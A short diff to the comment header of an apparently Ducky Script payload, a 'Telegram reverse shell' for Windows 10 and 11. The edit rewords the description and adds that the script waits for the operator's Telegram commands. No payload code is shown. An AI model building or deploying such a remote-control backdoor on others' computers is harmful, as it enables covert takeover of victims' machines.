@@ -1,6 +1,7 @@
 REM Title:  Simple Telegram Reverse Shell
 REM Author: @beigeworm
-REM Description: This script connects target computer with a telegram chat to send powershell commands.
+REM Description: A script that connects target computer with a telegram chat to send powershell commands.
+REM              The script will wait in a loop until you interact with it later on via telegram.
 REM Target: Windows 10,11
 
 REM SETUP INSTRUCTIONS
